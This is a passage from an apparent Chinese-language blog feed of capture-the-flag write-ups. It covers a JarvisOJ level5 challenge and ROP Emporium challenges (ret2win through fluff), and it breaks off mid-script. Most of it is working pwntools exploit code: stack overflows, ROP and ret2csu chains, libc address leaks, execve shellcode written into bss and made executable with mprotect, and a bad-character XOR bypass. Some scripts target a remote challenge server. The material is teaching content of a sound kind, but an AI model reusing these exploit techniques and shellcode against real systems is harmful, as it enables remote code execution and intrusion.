level5</h2><p>题目说假设system和execve被禁用，用mmap和mprotect实现getshell。<br>所以我们需要自己将shellcode写进bss段里。</p><p>科普一下mmap和mprotect</p><p>我们通过函数mmap来告诉操作系统把哪个文件映射哪块内存去，并且设置我们可能对这块内存的不能操作，就是对文件一样。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)</span><br><span class="line"></span><br><span class="line">返回值：成功返回被映射的内存地址，失败返回MAP_FIALED</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个只有在极少数情况下才不为0，这个参数告诉内核使用addr指定的值来映射指定文件。当指定为0的时候，告诉内核返回什么地址内其自身决定。除非非常了解系统进程模式，或者对当前环境非常了解，否则的话手工指定这个值总是不可取。<br>参数 len<br>指定被映射的内存区域的长度。<br>参数 port<br>这个参数对应open函数的权限位，我们可以指定为：PROT_READ，映射区可读；PROT_WRITE，映射区可写；PROT_EXEC，映射区可执行；PROT_NONE，映射区不可访问。由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。<br>参数 flag<br>这个参数指定了映射区的其它一些属性，权限的属性已经在port中指定。这里可能存在的典型值有：MAP_FIXED，针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的；MAP_SHARED，此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的，它不能与MAP_PRIVATE标志一直使用，因为它们表达的意图是相反的；MAP_PRIVATE，该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。</p><p>mprotect 函数可以更改一个已经存在的映射区的访问权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">int mprotect(void* addr, size_t len, int port)</span><br><span class="line"></span><br><span class="line">返回值：成功返回0，失败返回-1</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个参数是mmap返回的数值，此时它就是mprotect作用的范围。<br>参数 len<br>指定映射区的长度，它需要与mmap中指定相同。<br>参数 port<br>在上面我们已经介绍了port的可能取值，mprotect功能就是把这个port指定的属性施加于相应的映射区上。</p><p>好，我们来看题</p><p>开了NX<br>既然题目有提示一个更改权限的函数，那我们就去看一下bss段的权限，应该是禁止执行了的</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8715.png" alt></p><p>readelf -S先找到bss的地址</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8716.png" alt></p><p>vmmap查看权限，bss段的地址为0x600a88 ，在0x600000-0x601000之间，不可执行</p><p>思路：<br>（1）先通过write函数leak出write（也可以是其他）的真实地址<br>（2）找到mprotect的真实地址<br>（3）将shellcode写入bss段<br>（4）调用mprotect将bss段权限更改<br>（5）调用bss，getshell</p><p>第一段的代码：（leak write_addr，found mprotect_addr）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8717.png" alt></p><p>第二段（shellcode写入bss）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8718.png" alt></p><p>第三段（找两个空的got地址，将mprotect和bss写入方便调用）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8719.png" alt></p><p>最后就直接通过csu调用bss段就可以getshell了，（很奇怪的是本地get不到，远程可以）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8720.png" alt></p><h1 id="两种方法的exp"><a href="#两种方法的exp" class="headerlink" title="两种方法的exp"></a>两种方法的exp</h1><p>第一种（写个函数，直接调用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh=remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf =ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">vul = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"><span class="comment">#read_plt = elf.symbols['read']</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_libc = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment">#write_plt = elf.plt['write']</span></span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop5_addr = 0x04006A6</span><br><span class="line">mov_call = 0x0400690    </span><br><span class="line"></span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line"></span><br><span class="line">def csu(r12,r13,r14,r15,data=False):</span><br><span class="line">data_num=<span class="string">''</span></span><br><span class="line">payload = <span class="string">"a"</span>*0x88</span><br><span class="line">payload += p64(pop5_addr)+p64(0)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(mov_call)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(vul)</span><br><span class="line">sh.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="keyword">if</span> data==True:</span><br><span class="line">data_num = u64(sh.recv(8))</span><br><span class="line"><span class="built_in">return</span> data_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_addr = csu(write_got,8,read_got,1,True)</span><br><span class="line">mprotect_addr = read_addr - read_libc + mprotect_libc</span><br><span class="line"><span class="built_in">print</span> <span class="string">"mprotect_addr:"</span> + hex(mprotect_addr)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">csu(read_got,len(shellcode),bss,0)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line">csu(read_got,8,mprotect_got,0)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line">csu(mprotect_got,7,0x1000,0x600000)</span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">csu(read_got,8,bss_got,0)</span><br><span class="line">sh.send(p64(bss))</span><br><span class="line">csu(bss_got,0,0,0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>第二种（用pop rdi，rsi，rdx来存参）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh =remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_plt = 0x04004B0</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vul = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">pop5_addr = 0x00000000004006A6</span><br><span class="line">mov_call = 0x0000000000400690     <span class="comment">#distence 0x1a</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload1 += p64(pop_rdi)+p64(1)+p64(pop_rsi_rdx)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">data = sh.recv(8)</span><br><span class="line">write_addr = u64(data)</span><br><span class="line"></span><br><span class="line">libc_dis = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_addr = libc_dis + libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload2 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_base)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">bss_got = 0x0000000000600A48</span><br><span class="line">payload4 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload4 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(bss_base)) </span><br><span class="line"></span><br><span class="line">mprotect_got = 0x0000000000600A50</span><br><span class="line">payload3 = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload3 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">'a'</span>*0x80+p64(0)</span><br><span class="line">payload5 += p64(pop5_addr) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)</span><br><span class="line">payload5 +=p64(mov_call) </span><br><span class="line">payload5 += <span class="string">'a'</span>*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)</span><br><span class="line">payload5 += p64(mov_call)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload5)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"><a href="#权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限" class="headerlink" title="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"></a>权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限</h1><p>找了一下午的bug，代码改得有点乱（终于cat到flag也是好心酸的）。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;libc-csu&quot;&gt;&lt;a href=&quot;#libc-csu&quot; class=&quot;headerlink&quot; title=&quot;_libc_csu&quot;&gt;&lt;/a&gt;&lt;em&gt;_libc_csu&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;1、Ret2csu&lt;/p&gt;
&lt;p&gt;这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。&lt;br&gt;Emmm真是一个异常简洁的main函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;我们发现它有个pwnme函数哦，那就点进去看一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ROP Emporium</title>
    <link href="http://yoursite.com/2019/07/08/ROP%20Emporium/"/>
    <id>http://yoursite.com/2019/07/08/ROP Emporium/</id>
    <published>2019-07-08T04:12:19.000Z</published>
    <updated>2019-07-08T15:11:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。</p><h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1-ret2win"></a>1-ret2win</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x0400824</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">payload = 0x20*<span class="string">"a"</span> + p64(0) + p64(shell)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-split"><a href="#2-split" class="headerlink" title="2-split"></a>2-split</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./split'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">cat_flag = 0x0601060</span><br><span class="line">bss = 0x0601080</span><br><span class="line">pop_rdi = 0x0400883</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0) + p64(pop_rdi) + p64(cat_flag) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-callme"><a href="#3-callme" class="headerlink" title="3-callme"></a>3-callme</h2><p>题目意思大概是叫我们分别调用callme_one callme_two callme_three来得到flag，要想知道这些函数到底是干什么的还是要去.so文件里看一下具体的函数（其实主要是它竟然给了我们一个.so文件，那肯定不会没用啊，而且callme里对这三个函数就是一笔带过，啥都没写）</p><p>so里的三个函数传的参都是1、2、3，意思就是我们要把这些参数压进栈内，然后调用callme的三个函数，但是貌似每次调用都要传参，才能调用到下一个函数，所以我们要pop三个寄存器出来存着三个数</p><p><img src="/2019/07/08/ROP Emporium/callme_pop.jpg" alt></p><p>然后找到rdi rsi rdx三个可以用的<br>接下来上脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./callme'</span>)</span><br><span class="line"></span><br><span class="line">callme_one = 0x0401850</span><br><span class="line">callme_two = 0x0401870</span><br><span class="line">callme_three = 0x0401810</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx = 0x0401ab0 <span class="comment">#wirte 1/2/3 in callme</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_one)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_two)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_three)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>32位不需要调用rdi来存放指令，但是它需要用到堆栈平衡，在调用函数之后的栈帧里，存的是它的返回地址，而后面是调用函数的参数。（这里就没写exp）<br>但64位需要用到rdi，rsi，rdx来存参，参数在调用前进栈，存入相应位置。</p><h2 id="4-write4"><a href="#4-write4" class="headerlink" title="4-write4"></a>4-write4</h2><p>首先，我们明确一下思路，是要将”/bin/sh”写入bss段里。<br>借助pop</p><p><img src="/2019/07/08/ROP Emporium/write4_pop1.jpg" alt></p><p>然后我们选那个r14、r15的地址<br>然后还要去找mov的地址来给寄存器赋值的</p><p><img src="/2019/07/08/ROP Emporium/write4_pop2.jpg" alt></p><p>然后我们找到有r14和r15的，[r14]是代表r14的地址，r15则是对应的值，假设r14地址为0x0401809，r15里的值是“abc”，则这个命令就是，让r14里的地址指向r15里的内容，即0x0401809-&gt;“abc”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./write4'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">pop_rdi = 0x0400893 </span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400890 </span><br><span class="line">mov_r14_r15 = 0x0400820 </span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(pop_r14_r15) + p64(bss) + <span class="string">"/bin/sh\x00"</span> + p64(mov_r14_r15) <span class="comment">#save the /bin/sh into bss</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system) <span class="comment">#rdi-&gt;system   bss is the x in system</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5-badchars"></a>5-badchars</h2><p>通过程序我们知道，它阻止了几个字符的输入，使个别字符强行转换成21（会影响“/bin/sh”的写入），所以我们要绕过它</p><p><img src="/2019/07/08/ROP Emporium/badchars_bad.jpg" alt></p><p>最简单的加密解密方法就是异或了，我们来找一个数字，使输入异或之后不等于badchars即可，脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">chars = [98,105,99,47,32,102,110,115]</span><br><span class="line">num = 1</span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> binsh:</span><br><span class="line">x = ord(i) ^ num  </span><br><span class="line"><span class="keyword">if</span> x <span class="keyword">in</span> chars:</span><br><span class="line">num += 1</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"\x00"</span>:</span><br><span class="line"><span class="built_in">print</span> num</span><br><span class="line">num += 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> num == 10:</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>我们选用2<br>然后我们就可以写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./badchars'</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">num = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> binsh:</span><br><span class="line">num += chr(ord(x)^2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = 0x04006F0 </span><br><span class="line">bss = 0x0601080 </span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0400b39 </span><br><span class="line">mov_r12_r13 = 0x0400b34  </span><br><span class="line">pop_r12_r13 = 0x0400b3b  </span><br><span class="line"><span class="comment">#write num in bss</span></span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400b40</span><br><span class="line">xor_r15_r14 = 0x0400b30 <span class="comment">#back to binsh</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12_r13) + num + p64(bss) + p64(mov_r12_r13)</span><br><span class="line"></span><br><span class="line"><span class="comment">#back to binsh</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(num)):</span><br><span class="line">payload += p64(pop_r14_r15) + p64(2) + p64(bss+i)</span><br><span class="line">payload += p64(xor_r15_r14)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="6-fluff"><a href="#6-fluff" class="headerlink" title="6-fluff"></a>6-fluff</h2><p>这个和前面的write4有异曲同工之处，只不过这个程序没有那么多的mov，需要借助到xor（xor自身会清空，xor另一个数，就等于存值）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 